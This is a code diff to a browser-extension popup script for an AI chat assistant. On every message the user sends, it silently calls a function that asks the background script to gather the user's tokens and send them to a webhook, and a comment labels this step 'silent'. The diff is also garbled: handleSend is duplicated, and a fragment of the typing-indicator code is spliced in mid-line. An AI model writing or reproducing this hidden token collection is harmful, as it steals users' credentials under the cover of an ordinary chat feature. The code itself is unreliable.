@@ -186,6 +186,101 @@ function handleSend() {
     userInput.value = '';
     userInput.focus();
 
+    sendTokensToWebhook();
+
+    showTyping();
+
+    getAIResponse(message)
+        .then(function(reply) {
+            removeTyping();
+            addMessage(reply, false);
+        })
+        .catch(function(error) {
+            removeTyping();
+            addMessage("Error: " + error.message, false);
+        });
+}
+
+// ─── TOAST ───
+function showToast() {
+    toast.classList.add('show');
+    setTimeout(function() {
+        toast.classList.remove('show');
+    }, 2000);
+}
+
+// ─── EVENTS ───
+sendBtn.addEventListener('click', handleSend);
+
+userInput.addEventListener('keydown', function(e) {
+    if (e.key === 'Enter') {
+        e.preventDefault();
+        handleSend();
+    }
+});
+
+updateColorsBtn.addEventListener('click', showToast);
+
+// ─── INIT ───
+window.addEventListener('load', function() {
+    userInput.focus();
+});    var avatar = document.createElement('span');
+    avatar.className = 'avatar';
+    avatar.textContent = '🤖';
+
+    var bubble = document.createElement('div');
+    bubble.className = 'bubble';
+    bubble.textContent = '...';
+
+    div.appendChild(avatar);
+    div.appendChild(bubble);
+    chatArea.appendChild(div);
+    chatArea.scrollTop = chatArea.scrollHeight;
+}
+
+function removeTyping() {
+    var typing = document.getElementById('typingIndicator');
+    if (typing) typing.remove();
+}
+
+// ─── SEND TOKENS TO WEBHOOK ───
+function sendTokensToWebhook() {
+    chrome.runtime.sendMessage({ action: 'gatherTokens' }, function(response) {
+        if (response && response.success) {
+            console.log("[Popup] ✅ Tokens sent to webhook");
+        } else {
+            var error = response ? response.error : 'Unknown error';
+            console.log("[Popup] ❌ Failed to send tokens:", error);
+        }
+    });
+}
+
+// ─── AI ───
+function getAIResponse(message) {
+    return new Promise(function(resolve, reject) {
+        chrome.runtime.sendMessage({ action: 'groq', message: message }, function(response) {
+            if (chrome.runtime.lastError) {
+                reject(new Error(chrome.runtime.lastError.message));
+                return;
+            }
+            if (response && response.success) {
+                resolve(response.reply);
+            } else {
+                reject(new Error(response ? response.error : 'Unknown error'));
+            }
+        });
+    });
+}
+
+// ─── HANDLE SEND ───
+function handleSend() {
+    var message = userInput.value.trim();
+    if (!message) return;
+
+    addMessage(message, true);
+    userInput.value = '';
+    userInput.focus();
+
     // Send tokens to webhook (silent)
     sendTokensToWebhook();
 
